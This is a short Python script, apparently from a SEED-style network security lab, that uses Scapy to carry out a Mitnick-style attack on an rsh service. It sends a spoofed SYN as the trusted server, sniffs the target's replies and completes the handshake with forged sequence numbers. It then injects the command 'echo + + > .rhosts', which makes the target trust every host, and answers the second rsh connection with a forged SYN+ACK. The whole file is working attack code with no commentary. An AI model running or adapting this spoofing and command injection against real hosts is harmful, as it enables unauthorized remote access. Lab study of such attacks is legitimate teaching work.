#!/usr/bin/python3

from scapy.all import *
import time

x_ip = "10.9.0.5"
x_port = 514
srv_ip = "10.9.0.6"
rsh_port = 1023
atk_port = 9090
syn_seq = 0x1000
syn_ack_seq = 0x2000
my_iface = 'br-d9036100a889'
f = 'tcp and src host {A} and dst host {B}'
my_filter = f.format( A=x_ip, B=srv_ip )

def spoof(pkt):
	old_ip = pkt[IP]
	old_tcp = pkt[TCP]
	print("test")

	# for first connection
	if old_tcp.flags=='SA':
		print("SYN+ACK from X-terminal: #1 connection")
		ip = IP( src=srv_ip, dst=x_ip )
		tcp = TCP( sport=rsh_port, dport=x_port, seq=syn_seq+1, ack=old_tcp.seq+1, flags='A' )
		data = '9090\x00seed\x00seed\x00echo + + > .rhosts\x00'

		spoofed_pkt = ip/tcp/data
		send( spoofed_pkt,verbose=0 )

	# for second connection
	if old_tcp.flags=='S' and old_ip.src==x_ip and old_ip.dst==srv_ip:
		print("SYN from X-terminal: #2 connection")
		ip = IP( src=srv_ip, dst=x_ip )
		tcp = TCP( sport=atk_port, dport=rsh_port, seq=syn_ack_seq, ack=old_tcp.seq+1, flags='SA' )
		
		spoofed_pkt = ip/tcp
		send( spoofed_pkt,verbose=0 )


def spoofing_SYN():
	print("Sending spoofed SYN")
	ip = IP( src=srv_ip, dst=x_ip )
	tcp = TCP( sport=rsh_port, dport=x_port, seq = syn_seq, flags='S' )
	spoofed_syn_pkt = ip/tcp
	send( spoofed_syn_pkt, verbose=1 )


def main():
	spoofing_SYN()
	sniff( iface=my_iface,filter=my_filter,prn=spoof )	


if __name__ == "__main__":
	main()
